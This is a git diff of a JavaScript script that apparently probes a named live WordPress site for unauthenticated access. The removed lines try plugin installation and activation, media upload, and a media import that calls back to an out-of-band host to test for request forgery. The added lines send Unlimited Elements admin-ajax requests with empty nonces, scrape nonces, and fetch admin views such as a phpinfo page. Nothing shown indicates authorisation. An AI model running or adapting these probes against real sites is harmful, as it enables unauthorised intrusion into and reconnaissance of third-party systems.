@@ -1,31 +1,23 @@
-const UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140 Safari/537.36';
-const hosts=['https://signup.riseup.co.il','https://www.riseup.co.il'];
-const paths=[
-  '/wp-json/elementor/v1/onboarding/install-pro',
-  '/wp-json/elementor/v1/onboarding/install-theme',
-  '/wp-json/elementor-one/v1/plugins',
-  '/wp-json/wp/v2/plugins',
-  '/wp-json/elementor/v1/documents/9756/media/import',
-  '/wp-json/wp/v2/media'
-];
-async function req(host,path,method='GET',body) {
+const UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
+const host='https://www.riseup.co.il';
+async function req(path,method='GET',body,headers={}) {
   try {
-    const opt={method,redirect:'manual',headers:{'user-agent':UA,'accept':'application/json'}};
-    if(body!==undefined){opt.headers['content-type']='application/json';opt.body=JSON.stringify(body)}
+    const opt={method,redirect:'manual',headers:{'user-agent':UA,'accept':'text/html,application/json;q=0.9,*/*;q=0.8',...headers}};
+    if(body!==undefined){opt.body=body}
     const r=await fetch(host+path,opt), t=await r.text();
-    console.log('RES',JSON.stringify({host,path,method,status:r.status,allow:r.headers.get('allow'),ct:r.headers.get('content-type'),body:t.slice(0,1200)}));
-  } catch(e){console.log('ERR',JSON.stringify({host,path,method,error:String(e),cause:String(e?.cause||'')}))}
+    const rec={path,method,status:r.status,location:r.headers.get('location'),setcookie:r.headers.get('set-cookie'),ct:r.headers.get('content-type'),len:t.length,nonce:[...t.matchAll(/g_ucNonce\s*=\s*["']([^"']+)/g)].map(x=>x[1]),markers:[...new Set((t.match(/unlimitedelements|Action security failed|access denied|registration|Register|user_login|wp-submit|uc-view-[a-z0-9_-]+/gi)||[]))].slice(0,30),body:t.slice(0,2400)};
+    console.log('RES',JSON.stringify(rec));
+  } catch(e){console.log('ERR',JSON.stringify({path,method,error:String(e),cause:String(e?.cause||'')}))}
 }
 console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()).catch(e=>'ERR:'+e));
-for(const host of hosts){
-  try{
-    const r=await fetch(host+'/wp-json/',{headers:{'user-agent':UA,'accept':'application/json'}}),j=await r.json();
-    const routes={};
-    for(const [k,v] of Object.entries(j.routes||{})) if(paths.includes('/wp-json'+k)) routes[k]=v;
-    console.log('ROOT',JSON.stringify({host,status:r.status,name:j.name,namespaces:j.namespaces,routes}));
-  }catch(e){console.log('ROOTERR',host,String(e),String(e?.cause||''))}
-  for(const p of paths){await req(host,p,'OPTIONS');await req(host,p,'GET')}
-  await req(host,'/wp-json/elementor-one/v1/plugins','POST',{slug:'elementor',status:'active'});
-  await req(host,'/wp-json/wp/v2/media','POST',{});
-  await req(host,'/wp-json/elementor/v1/documents/9756/media/import','POST',{url:'https://7xqvfwha.requestrepo.com/wp-media-probe-'+(process.env.GITHUB_RUN_ID||'x')+'.png'});
-}
+await req('/');
+await req('/wp-login.php?action=register');
+await req('/wp-admin/');
+const qs=[
+ 'action=unlimitedelements_ajax_action&client_action=show_preview',
+ 'action=unlimitedelements_ajax_action&client_action=show_preview&nonce=&data='+encodeURIComponent(JSON.stringify({name:'logo_marquee',addontype:'elementor'})),
+ 'action=unlimitedelements_ajax_action&client_action=get_addon_output_data&nonce=&data='+encodeURIComponent(JSON.stringify({name:'logo_marquee',addontype:'elementor'}))
+];
+for(const q of qs){await req('/wp-admin/admin-ajax.php?'+q);await req('/wp-admin/admin-ajax.php','POST',q,{'content-type':'application/x-www-form-urlencoded'})}
+const views=['addons_elementor','testaddon','testaddonnew','addondefaults','troubleshooting-phpinfo','troubleshooting-showobjects'];
+for(const view of views){await req('/wp-admin/admin.php?page=unlimitedelements&ucwindow=blank&view='+view+'&id=1')}
